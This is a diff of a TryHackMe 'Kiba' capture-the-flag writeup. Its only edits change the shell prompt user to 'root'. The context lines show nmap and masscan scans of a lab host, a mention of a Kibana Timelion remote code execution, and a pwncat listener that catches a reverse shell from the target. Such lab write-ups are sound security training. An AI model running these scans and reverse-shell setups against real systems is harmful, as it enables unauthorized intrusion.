@@ -29,7 +29,7 @@ The Following Post is writeup of Kiba room of tryhackme <https://tryhackme.com/r
 Let's start with nmap scan.
 
 ```bash
- ─[argenestel@parrot]─[~/Desktop/kiba]
+ ─[root@parrot]─[~/Desktop/kiba]
 └──╼ $nmap -sC -sV -oA nmap/kiba -v 10.10.166.67
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-29 14:42 IST
 NSE: Loaded 151 scripts for scanning.
@@ -83,7 +83,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ah that's 1000 port let's see masscan
 
 ```bash
-┌─[✗]─[argenestel@parrot]─[~/Desktop/argenestel.github.io]
+┌─[✗]─[root@parrot]─[~/Desktop/argenestel.github.io]
 └──╼ $sudo masscan -i tun0 -p0-10000 10.10.34.204
 
 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-01 21:34:21 GMT
@@ -120,7 +120,7 @@ There is a remote code execution in kibana at timelion function we can search ab
 
 and
 
-┌─[argenestel@parrot]─[~/Downloads]
+┌─[root@parrot]─[~/Downloads]
 └──╼ $pwncat --listen --port 4444
 [15:55:23] received connection from 10.10.166.67:39932                                                                  connect.py:148
 [15:55:26] new host w/ hash be486dbcf9a5edbfffd09b3f51163d7b                                                             victim.py:329
